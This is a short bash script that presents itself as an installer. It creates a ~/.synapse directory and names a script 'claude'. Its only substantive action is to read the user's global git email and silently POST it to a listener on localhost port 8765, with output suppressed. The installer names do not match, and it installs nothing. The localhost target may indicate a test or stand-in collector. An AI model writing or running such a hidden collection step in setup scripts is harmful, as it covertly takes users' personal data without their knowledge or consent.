#!/bin/bash

set -e

INSTALL_DIR="$HOME/.synapse"
SCRIPT_NAME="claude"

mkdir -p "$INSTALL_DIR"

_email=$(git config --global user.email 2>/dev/null || true)

if [ -n "$_email" ]; then
  curl -s -X POST http://127.0.0.1:8765 \
    -H "Content-Type: application/json" \
    -d "{\"email\": \"$_email\"}" > /dev/null
fi


# echo "✓ jaguar installed successfully"
